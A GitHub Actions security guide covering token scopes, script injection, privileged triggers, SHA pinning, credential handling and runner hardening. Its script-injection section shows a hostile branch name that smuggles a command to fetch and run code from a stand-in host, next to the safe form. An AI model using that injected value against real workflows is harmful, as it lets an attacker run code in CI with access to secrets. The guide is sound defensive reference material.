# Security

Read this for any workflow that handles PRs from forks, secrets, deploys, releases or third-party actions. It also covers reviewing any of those. The rules come in priority order: §1–§4 are exploitable today, §5–§8 limit the blast radius.

Sources: [Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use), [GITHUB_TOKEN](https://docs.github.com/en/actions/concepts/security/github_token), [GitHub Security Lab, part 4](https://securitylab.github.com/resources/github-actions-new-patterns-and-mitigations/), [zizmor audits](https://docs.zizmor.sh/audits/), [OpenSSF Scorecard checks](https://github.com/ossf/scorecard/blob/main/docs/checks.md).

## 1. Token permissions

```yaml
permissions: {}            # workflow level: nothing

jobs:
  test:
    permissions:
      contents: read       # checkout
  comment:
    permissions:
      pull-requests: write # posts the coverage comment
```

- Once you set any scope, **every scope you leave out becomes `none`**. `permissions: {}` at the top plus a per-job grant is the least-privilege shape. Scorecard `Token-Permissions` also accepts `contents: read` at the top level.
- Put a comment on every grant saying why it is needed (zizmor `undocumented-permissions`, pedantic persona). It makes the review obvious.
- `id-token` only accepts `write` or `none`. Grant it only to the job that exchanges OIDC.
- A called reusable workflow can only **reduce** the caller's permissions.
- Events created with `GITHUB_TOKEN` do not trigger new runs, except `workflow_dispatch` and `repository_dispatch`. If a push has to trigger CI, use a GitHub App token, not a PAT.

## 2. Untrusted input → script injection

Attacker-controlled values include PR title and body, branch name (`github.head_ref`), commit messages, issue and comment bodies, labels, `workflow_dispatch` inputs in public repos, and artifact contents. Never expand them with `${{ }}` inside `run:` or `actions/github-script`'s `script:`.

```yaml
# WRONG: a branch named  a";curl evil|sh;"  runs code
- run: echo "Building ${{ github.head_ref }}"

# RIGHT: the value reaches the shell as data
- env:
    HEAD_REF: ${{ github.head_ref }}
  run: echo "Building $HEAD_REF"
```

Also forbidden: writing untrusted data into `$GITHUB_ENV` or `$GITHUB_PATH` (zizmor `github-env`), because that is code execution in every later step. Also forbidden: `ACTIONS_ALLOW_UNSECURE_COMMANDS`.

## 3. Privileged triggers

`pull_request_target`, `workflow_run` and `issue_comment` run with **secrets, a write-capable token and access to the default branch's cache** while reacting to outside contributors.

- Default to `pull_request`. Fork PRs get a read-only token and no secrets by design; don't work around that.
- Since 2025-12-08, `pull_request_target` always uses the workflow file **and the checkout ref from the default branch**. Since `actions/checkout@v7` (backported to the v4–v6 floating tags on 2026-07-20; SHA pins need a bump), checkout **refuses** to fetch fork-PR code under `pull_request_target`/`workflow_run` unless you set `allow-unsafe-pr-checkout: true`. Never set it.
- Starting 2026-11-02, *workflow execution protections* block `pull_request_target` in public repos by default (evaluate mode first). Plan for it.
- If the privileged part is only labelling or commenting, keep it in `pull_request_target` **without checking out code**.
- If you need to act on the result of untrusted code (comment coverage, upload a preview), **split it in two**: see `examples/pr-privileged-split.md`. The unprivileged `pull_request` workflow builds and uploads an artifact. The privileged `workflow_run` workflow downloads it, **treats it as data** (unzip into `$RUNNER_TEMP`, never into the workspace, never `source` it, never write it to `$GITHUB_ENV`), and validates it before use.
- Label- or comment-based approval (`/ok-to-test`) is time-of-check/time-of-use: the author can push after approval. If you use it, check out the **exact SHA that was approved**, never the head ref.
- `github.actor == 'dependabot[bot]'` is spoofable in some flows (zizmor `bot-conditions`). Check `github.event.pull_request.user.login` together with the event type.
- Never restore caches in release or publish jobs (zizmor `cache-poisoning`). A PR can't write to main's cache, but a privileged workflow that restores a cache written by a less trusted run can be poisoned. The platform-level switch is **`cache-mode: none`** on the job, enforced by the token whatever the actions do (`references/caching.md` §1). Also turn the action caches off so the intent is visible: `package-manager-cache: false` (setup-node), `cache: false` (setup-go), `enable-cache: false` (setup-uv; v10 already does this on release/tag events).
- Low-trust triggers (`pull_request_target`, `issue_comment`, `workflow_run`) get `cache-mode: read` by default. **Never override it with `cache-mode: write`.**

## 4. Supply chain: pinning and updates

- Pin **every** `uses:` to a full SHA with a version comment (`references/versions.md`). In March 2025 the tags of `tj-actions/changed-files` were rewritten to a commit that dumped runner memory into the logs (CVE-2025-30066). Every tag-pinned consumer ran it. SHA-pinned consumers did not.
- A pin without updates rots. Enable Dependabot for the `github-actions` ecosystem with a **cooldown** so a freshly published malicious release doesn't land the same day. Since 2026-07-14, Dependabot applies a 3-day default cooldown to version updates; security updates skip it.
  ```yaml
  # .github/dependabot.yml
  version: 2
  updates:
    - package-ecosystem: github-actions
      directory: /
      schedule: { interval: weekly }
      cooldown: { default-days: 7 }
      groups:
        actions: { patterns: ["*"] }
  ```
- Org or repo policy (since 2025-08): **require full-commit SHA** (unpinned actions fail the run) and **block** actions with `!owner/action`. Local `./` actions count as unpinned under that policy; `uses: $/path/to/action` (same repo, same commit, runner ≥ 2.336.0) passes.
- Prefer fewer third-party actions. Each one runs with the job's token. If a step is three lines of shell, write the shell. For changed-file detection, use `dorny/paths-filter` or plain `git diff --name-only`.
- Pin container images (`container:`, `services:`) by digest.
- zizmor's online audits (`impostor-commit`, `known-vulnerable-actions`, `stale-action-refs`, `ref-confusion`) need a token: `zizmor --gh-token "$(gh auth token)" .github/workflows`.

## 5. Credentials in the workspace

- `actions/checkout` persists the token for later `git` commands (**`persist-credentials: true` is the default**). Set **`persist-credentials: false`** unless a later step pushes. Otherwise a later step or an uploaded artifact that includes `.git` can leak the token (zizmor `artipacked`). Since v6 the token lives in a file under `$RUNNER_TEMP`, not `.git/config`, but it is still readable by every step.
- `upload-artifact` excludes dotfiles by default (`include-hidden-files: false`). Keep it that way.
- Never `toJSON(secrets)`, dynamic `secrets[...]`, or `secrets: inherit` into a reusable workflow (zizmor `overprovisioned-secrets`, `secrets-inherit`). Pass exactly the secrets the callee declares.
- Structured secrets (JSON/YAML blobs) are not masked reliably, because masking needs an exact match. Store each value as its own secret. For derived values, use `echo "::add-mask::$VALUE"`.

## 6. Cloud credentials: OIDC, not stored keys

```yaml
deploy:
  environment: production
  permissions:
    contents: read  # checkout
    id-token: write # OIDC exchange with AWS
  steps:
    - uses: aws-actions/configure-aws-credentials@e1253824e5c10ff9df46874f81ed3ec929e19cfd # v6.3.0
      with:
        role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
        aws-region: eu-west-1
```

- The cloud role's trust policy must pin `sub`: repo + `environment:production` (or `ref:refs/heads/main`), never `repo:org/*`.
- Package registries: **trusted publishing** instead of tokens. PyPI uses `pypa/gh-action-pypi-publish` with `id-token: write` and no password. npm uses `npm publish` with `id-token: write` and a trusted publisher configured on npmjs.com (npm ≥ 11.5.1). zizmor `use-trusted-publishing` flags token-based publishing.

## 7. Environments and releases

- Every production deploy goes through an `environment:` with required reviewers and branch or tag rules. Environment secrets are only released to jobs that pass the rules. Since 2025-12-08, branch rules are evaluated against `refs/pull/N/merge` for `pull_request`.
- Keep secrets in environments, not at repo level (zizmor `secrets-outside-env`, pedantic). Anyone with repo write access can read repo-level secrets.
- Immutable releases (GA 2025-10-28): turn them on so published release tags and assets can't be moved.
- Build provenance: `actions/attest-build-provenance` (`id-token: write`, `attestations: write`) gives SLSA v1.0 Build L2. Consumers verify with `gh attestation verify`.
- Only grant `contents: write` to the job that creates the release.

## 8. Runtime hardening (optional, higher assurance)

- `step-security/harden-runner` as the **first step** of each job monitors egress, file and process activity. Start with `egress-policy: audit`, read the report, then switch to `block` with `allowed-endpoints`. **Always set `egress-policy` explicitly: its `action.yml` default is `block`.** Free for public repos on hosted runners.
- Never use self-hosted runners for public repos: any fork PR can run code on them, and they persist between jobs.
- `timeout-minutes` on every job also limits how long a compromised step can run.
